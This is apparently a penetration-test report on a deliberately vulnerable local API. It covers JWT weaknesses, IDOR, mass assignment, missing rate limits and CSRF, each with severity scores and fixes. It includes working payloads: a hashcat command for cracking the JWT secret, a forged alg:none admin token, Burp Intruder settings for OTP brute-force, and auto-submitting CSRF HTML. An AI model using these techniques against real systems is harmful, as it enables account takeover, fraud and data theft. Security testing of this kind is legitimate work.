Task 3 — JWT / Token Integrity

V2 — PII in Payload 5.9 Medium
JWT payload contains:
"ssn":        "123-45-6789"
"creditCard": "4111111111111111"
"balance":    1500
Any proxy/CDN/log that stores the token captures raw PII.
V1 — Weak Secret 7.4 High
Secret = secret123
Crackable in seconds:
hashcat -a 0 -m 16500 \
  token.txt rockyou.txt
# → secret123
Once cracked → forge any token for any user.
V3 — alg:none Bypass 9.8 CRITICAL
Unsigned token accepted by server:
Header:  {"alg":"none"}
Payload: {"role":"admin"}
Sig:     (empty)
eyJhbGciOiJub25lIn0.
eyJyb2xlIjoiYWRtaW4ifQ.
🔍 Cross-Device Token Reuse
No device fingerprint or IP binding. Token stolen from Device A works in Burp Repeater as Device B. Simply copy the Bearer token and replay it in any request.

Phase 3

Task 5 — IDOR (Horizontal & Vertical)

Horizontal IDOR 7.1 High — V8
Logged in as alice (id=1) — access any other user's data:
GET /api/users/2 HTTP/1.1
Authorization: Bearer <alice_token>
→ bob's SSN, credit card, password

GET /api/users/3/orders
→ admin's order history

GET /api/transactions?userId=3
→ admin's transaction history
Burp Intruder — User Enumeration
  • 1Capture GET /api/users/1
  • 2Send to Intruder → mark §1§
  • 3Payload: Numbers 1–1000, step 1
  • 4Filter: Status 200 = valid user
Vertical IDOR — No Role Check 8.8 High — V9
Admin endpoints accessible with any valid token:
# Dump all users (incl. passwords)
GET /api/admin/users
Authorization: Bearer <alice_token>
→ 200 OK — full user database

# Delete any user
DELETE /api/admin/users/2
→ {"message":"Deleted: bob"}

# Promote self to admin
POST /api/admin/promote
{"userId": 1}
→ {"message":"alice is now admin"}
Fix: requireAdmin middleware on all /api/admin/* routes.

Task 6 — BOPLA

V10 — Mass Assignment 8.1 High
Server uses Object.assign(user, req.body) — no field allowlist. Send any field you want to overwrite: 
PUT /api/users/1 HTTP/1.1
Authorization: Bearer <alice_token>
Content-Type: application/json

{
  "email":    "alice@evil.com",
  "role":     "admin",      ← escalation!
  "balance":  99999,       ← fraud!
  "password": "iownthis"   ← takeover!
}
→ {"role":"admin","balance":99999}

Phase 4

Task 7 — Rate Limiting

Forgot-Password Spam — V7 7.5 High
No cooldown or blocking. 100+ requests accepted.
Burp Intruder Steps
  • 1Capture POST /api/auth/forgot-password
  • 2Send to Intruder
  • 3Positions → mark email value with §
  • 4Payload: Null payloads × 100
  • 5Start → all return 200 OK
OTP Brute-Force — No Lockout
6-digit OTP = 1,000,000 combinations. No attempt limit.
Intruder Payload Settings:
Type: Numbers
From: 0  To: 999999  Step: 1
Min digits: 6  Max digits: 6

Positions tab:
{"email":"alice@victim.com",
 "otp":"§000000§"}
Burp Community
~50 req/s → cracked in ~5.5 hours
Burp Pro
Parallel → cracked in minutes
Fix
• express-rate-limit: 5 req / 15 min / IP on forgot-password • Lock OTP after 5 failed attempts • Expire OTP after 5 minutes • CAPTCHA on repeated failures

CSRF — Cross-Site Request Forgery

Why It Works — V6, V12 6.5 Medium
Missing DefenceConsequence
No SameSite=StrictCookie sent cross-origin
No CSRF tokenNo secret to forge
No Secure flagCookie sent over HTTP
PoC 1 — Fund Transfer
<form action="http://localhost:3000/api/transfer"
      method="POST" id="f">
  <input type="hidden" name="toUserId" value="3">
  <input type="hidden" name="amount"   value="500">
</form>
<script>f.submit()</script>
<!-- Victim's cookie sent automatically -->
Burp — Generate CSRF PoC
  • 1Capture POST /api/transfer in Proxy
  • 2Right-click → Engagement tools → Generate CSRF PoC
  • 3Enable "Include auto-submit script"
  • 4Click Test in browser (Burp Chromium bypasses SameSite)
  • 5$500 transferred from victim to attacker account
PoC 2 — Privilege Escalation
csrf_promote.html sends
PUT /api/users/1 {"role":"admin"}
using alice's cookie → alice becomes admin.
Attacker page disguised as a survey.
Note on SameSite Lax (Chrome 80+)
Blocks cross-site POST in modern browsers. Still affects older browsers, Safari WebViews, and Burp's embedded browser. Server MUST set the flag explicitly.
